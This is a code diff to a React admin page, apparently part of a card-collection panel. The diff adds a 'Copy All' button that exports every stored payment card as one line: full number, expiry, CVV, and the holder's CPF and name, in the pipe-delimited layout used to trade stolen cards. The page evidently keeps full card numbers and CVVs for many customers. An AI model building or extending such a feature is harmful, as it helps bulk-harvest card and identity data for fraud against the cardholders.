@@ -98,6 +98,21 @@ export default function CartoesPage() {
     alert(`${tipo} copiado!`);
   };
 
+  const copiarTodosCartoes = () => {
+    // Formato: NUMERO|MES|ANO|CVV|CPF NOME
+    const dados = cartoes.map(cartao => {
+      const [mes, ano] = (cartao.validade || "/").split("/");
+      const anoCompleto = ano ? `20${ano}` : "";
+      const cpfLimpo = cartao.cliente_cpf ? cartao.cliente_cpf.replace(/\D/g, "") : "";
+      const nome = cartao.titular_nome || cartao.cliente_nome || "";
+      
+      return `${cartao.numero_completo}|${mes}|${anoCompleto}|${cartao.cvv}|${cpfLimpo} ${nome}`;
+    }).join("\n");
+    
+    navigator.clipboard.writeText(dados);
+    alert(`${cartoes.length} cartões copiados em formato lista!`);
+  };
+
   if (carregando) {
     return (
       <div style={{ minHeight: "100vh", backgroundColor: "#0a0a0a" }}>
@@ -178,6 +193,23 @@ export default function CartoesPage() {
               }}
             >
               {mostrarTodos ? "🔒 Ocultar Todos" : "👁️ Mostrar Todos"}
+            </button>
+            <button
+              onClick={copiarTodosCartoes}
+              style={{
+                padding: "10px 20px",
+                backgroundColor: "#8b5cf6",
+                color: "white",
+                border: "none",
+                borderRadius: "8px",
+                cursor: "pointer",
+                fontSize: "14px",
+                fontWeight: "600",
+                transition: "all 0.2s"
+              }}
+              disabled={cartoes.length === 0}
+            >
+              📋 Copiar Todos ({cartoes.length})
             </button>
             <button
               onClick={() => router.push("/admin")}
